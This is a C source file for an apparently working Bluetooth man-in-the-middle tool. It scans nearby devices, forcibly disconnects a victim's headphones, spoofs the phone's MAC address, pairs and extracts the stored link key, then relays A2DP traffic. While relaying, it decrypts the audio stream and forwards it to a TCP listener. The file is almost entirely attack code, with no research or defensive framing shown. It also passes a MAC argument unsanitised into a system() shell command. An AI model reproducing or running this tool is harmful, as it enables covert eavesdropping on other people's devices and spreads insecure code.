#include "config.h"
#include "bt_utils.h"
#include "tcp_server.h"
#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>

static volatile int running = 1;

void signal_handler(int sig) {
    INFO_PRINT("Received signal %d, shutting down...", sig);
    running = 0;
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [OPTIONS]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  -s <source_mac>    Source device MAC address (phone)\n");
    fprintf(stderr, "  -t <target_mac>    Target device MAC address (headphones)\n");
    fprintf(stderr, "  -p <psm>           L2CAP PSM (default: 25 for A2DP)\n");
    fprintf(stderr, "  -P <port>          TCP server port (default: %d)\n", TCP_SERVER_PORT);
    fprintf(stderr, "  -S                 Scan for nearby Bluetooth devices\n");
    fprintf(stderr, "  -h                 Show this help\n");
}

void display_devices(bt_device_t *devices, int count) {
    printf("\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("  #  │  MAC Address       │  Status      │  Device Name\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    for (int i = 0; i < count; i++) {
        const char *status = devices[i].connected ? "CONNECTED  " : "Available  ";
        printf(" %2d  │  %s  │  %s │  %s\n", 
               i + 1, devices[i].addr, status, devices[i].name);
    }
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("Note: CONNECTED devices will be forcibly disconnected during MITM setup\n");
    printf("═══════════════════════════════════════════════════════════════════════════\n");
    printf("\n");
}

char* select_device(bt_device_t *devices, int count, const char *prompt) {
    int choice;
    while (1) {
        printf("%s (1-%d, 0 to rescan): ", prompt, count);
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            printf("Invalid input. Please enter a number.\n");
            continue;
        }
        while (getchar() != '\n');
        
        if (choice == 0) {
            return NULL;
        }
        
        if (choice >= 1 && choice <= count) {
            return devices[choice - 1].addr;
        }
        
        printf("Invalid choice. Please select a number between 1 and %d.\n", count);
    }
}

int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client) {
    uint8_t buffer[MAX_BUFFER_SIZE];
    fd_set read_fds;
    int max_fd;
    struct timeval timeout;
    
    INFO_PRINT("Entering relay loop...");
    
    while (running) {
        FD_ZERO(&read_fds);
        
        FD_SET(phone_sock, &read_fds);
        max_fd = phone_sock;
        
        FD_SET(headset_sock, &read_fds);
        if (headset_sock > max_fd) max_fd = headset_sock;
        
        if (tcp_client < 0) {
            FD_SET(tcp_server, &read_fds);
            if (tcp_server > max_fd) max_fd = tcp_server;
        }
        
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int ret = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            ERROR_PRINT("select() failed");
            return -1;
        }
        
        if (ret == 0) continue;
        
        if (tcp_client < 0 && FD_ISSET(tcp_server, &read_fds)) {
            tcp_client = tcp_accept_client(tcp_server);
            if (tcp_client >= 0) {
                INFO_PRINT("Streaming client connected");
            }
            continue;
        }
        
        if (FD_ISSET(phone_sock, &read_fds)) {
            ssize_t bytes = recv(phone_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Phone disconnected");
                } else {
                    ERROR_PRINT("Error reading from phone");
                }
                return -1;
            }
            
            DEBUG_PRINT("Received %zd bytes from phone", bytes);
            
            uint8_t decrypted[MAX_BUFFER_SIZE];
            int dec_len = crypto_decrypt_payload(buffer, bytes, decrypted);
            if (dec_len < 0) {
                ERROR_PRINT("Decryption failed");
                continue;
            }
            
            if (tcp_client >= 0) {
                if (tcp_send_data(tcp_client, decrypted, dec_len) < 0) {
                    INFO_PRINT("TCP client disconnected, closing connection");
                    close(tcp_client);
                    tcp_client = -1;
                }
            }
            
            uint8_t encrypted[MAX_BUFFER_SIZE];
            int enc_len = crypto_encrypt_payload(decrypted, dec_len, encrypted);
            if (enc_len < 0) {
                ERROR_PRINT("Encryption failed");
                continue;
            }
            
            ssize_t sent = send(headset_sock, encrypted, enc_len, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to headset");
                return -1;
            }
        }
        
        if (FD_ISSET(headset_sock, &read_fds)) {
            ssize_t bytes = recv(headset_sock, buffer, sizeof(buffer), 0);
            if (bytes <= 0) {
                if (bytes == 0) {
                    INFO_PRINT("Headset disconnected");
                } else {
                    ERROR_PRINT("Error reading from headset");
                }
                return -1;
            }
            
            DEBUG_PRINT("Received %zd bytes from headset (control data)", bytes);
            
            ssize_t sent = send(phone_sock, buffer, bytes, 0);
            if (sent < 0) {
                ERROR_PRINT("Failed to send to phone");
                return -1;
            }
        }
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    char *source_mac = NULL;
    char *target_mac = NULL;
    uint16_t psm = 25;
    uint16_t tcp_port = TCP_SERVER_PORT;
    int scan_mode = 0;
    
    int opt;
    while ((opt = getopt(argc, argv, "s:t:p:P:Sh")) != -1) {
        switch (opt) {
            case 's':
                source_mac = optarg;
                break;
            case 't':
                target_mac = optarg;
                break;
            case 'p':
                psm = atoi(optarg);
                break;
            case 'P':
                tcp_port = atoi(optarg);
                break;
            case 'S':
                scan_mode = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Interactive device selection if MAC addresses not provided
    if (!source_mac || !target_mac || scan_mode) {
        bt_device_t devices[50];
        int device_count;
        char source_selected[18] = {0};
        char target_selected[18] = {0};
        
        while (1) {
            device_count = bt_scan_devices(devices, 50, 8);
            if (device_count <= 0) {
                ERROR_PRINT("No devices found or scan failed");
                return 1;
            }
            
            display_devices(devices, device_count);
            
            if (!source_mac) {
                char *selected = select_device(devices, device_count, "Select source device (phone)");
                if (selected == NULL) {
                    continue;
                }
                strncpy(source_selected, selected, sizeof(source_selected) - 1);
                source_mac = source_selected;
            }
            
            if (!target_mac) {
                char *selected = select_device(devices, device_count, "Select target device (headphones)");
                if (selected == NULL) {
                    continue;
                }
                strncpy(target_selected, selected, sizeof(target_selected) - 1);
                target_mac = target_selected;
            }
            
            break;
        }
    }
    
    if (!source_mac || !target_mac) {
        ERROR_PRINT("Source and target MAC addresses are required");
        print_usage(argv[0]);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    INFO_PRINT("Bluetooth MITM Interceptor");
    INFO_PRINT("Source (phone): %s", source_mac);
    INFO_PRINT("Target (headset): %s", target_mac);
    INFO_PRINT("PSM: %d", psm);
    INFO_PRINT("TCP Port: %d", tcp_port);
    
    char adapter_mac[18];
    if (bt_get_adapter_address(adapter_mac, sizeof(adapter_mac)) < 0) {
        return 1;
    }
    
    INFO_PRINT("Step 1: Checking target device connection status");
    int target_connected = bt_check_connection_status(target_mac);
    
    if (target_connected) {
        INFO_PRINT("⚠️  WARNING: Target device is currently connected to another device");
        INFO_PRINT("MITM attack requires breaking this connection");
        
        // Attempt to force disconnect
        if (bt_force_disconnect(source_mac, target_mac) < 0) {
            ERROR_PRINT("Could not break existing connection automatically");
            INFO_PRINT("Please manually disconnect the target device and press Enter...");
            getchar();
        }
    } else {
        INFO_PRINT("✓ Target device is not connected - ready for MITM");
    }
    
    INFO_PRINT("Step 2: Spoofing MAC address to %s", source_mac);
    if (bt_spoof_mac_address(0, source_mac) < 0) {
        ERROR_PRINT("MAC spoofing failed - continuing anyway");
    }
    
    INFO_PRINT("Step 3: Auto-pairing with target device");
    INFO_PRINT("Ensure target device %s is in pairing mode", target_mac);
    INFO_PRINT("Auto-pairing will begin in 3 seconds...");
    sleep(3);
    
    if (bt_auto_pair_device(target_mac) < 0) {
        ERROR_PRINT("Auto-pairing failed");
        INFO_PRINT("You must manually pair with the device:");
        INFO_PRINT("  sudo bluetoothctl");
        INFO_PRINT("  scan on");
        INFO_PRINT("  pair %s", target_mac);
        INFO_PRINT("  trust %s", target_mac);
        INFO_PRINT("  connect %s", target_mac);
        INFO_PRINT("  quit");
        INFO_PRINT("Press Enter to continue after manual pairing...");
        getchar();
        
        // Verify pairing was successful before continuing
        INFO_PRINT("Verifying pairing status...");
        char verify_cmd[256];
        snprintf(verify_cmd, sizeof(verify_cmd), 
            "echo -e 'info %s\\nquit' | bluetoothctl 2>&1 | grep -q 'Paired: yes'", 
            target_mac);
        if (system(verify_cmd) != 0) {
            ERROR_PRINT("Device is not paired. Please complete pairing before continuing.");
            return 1;
        }
        INFO_PRINT("Pairing verified successfully");
    }
    
    INFO_PRINT("Step 4: Extracting link key");
    char link_key[64];
    if (bt_extract_link_key(adapter_mac, target_mac, link_key, sizeof(link_key)) < 0) {
        ERROR_PRINT("Failed to extract link key");
        ERROR_PRINT("Make sure the device is paired and the info file exists at:");
        ERROR_PRINT("  %s/%s/%s/info", BLUETOOTH_INFO_PATH, adapter_mac, target_mac);
        return 1;
    }
    
    if (crypto_init_link_key(link_key) < 0) {
        return 1;
    }
    
    INFO_PRINT("Step 5: Creating TCP server");
    int tcp_server = tcp_create_server(tcp_port);
    if (tcp_server < 0) {
        return 1;
    }
    int tcp_client = -1;
    
    INFO_PRINT("Step 6: Setting up Bluetooth relay");
    
    int phone_sock = bt_create_l2cap_socket();
    if (phone_sock < 0) {
        close(tcp_server);
        return 1;
    }
    
    if (bt_bind_l2cap(phone_sock, NULL, psm) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_listen_l2cap(phone_sock, 1) < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Waiting for phone to connect...");
    char phone_addr[18];
    int phone_conn = bt_accept_l2cap(phone_sock, phone_addr, sizeof(phone_addr));
    if (phone_conn < 0) {
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Phone connected: %s", phone_addr);
    
    INFO_PRINT("Connecting to headset...");
    int headset_sock = bt_create_l2cap_socket();
    if (headset_sock < 0) {
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    if (bt_connect_l2cap(headset_sock, target_mac, psm) < 0) {
        close(headset_sock);
        close(phone_conn);
        close(phone_sock);
        close(tcp_server);
        return 1;
    }
    
    INFO_PRINT("Connected to headset");
    INFO_PRINT("MITM relay established - intercepting traffic");
    
    relay_loop(phone_conn, headset_sock, tcp_server, tcp_client);
    
    INFO_PRINT("Cleaning up...");
    if (tcp_client >= 0) close(tcp_client);
    close(tcp_server);
    close(headset_sock);
    close(phone_conn);
    close(phone_sock);
    
    INFO_PRINT("Shutdown complete");
    return 0;
}
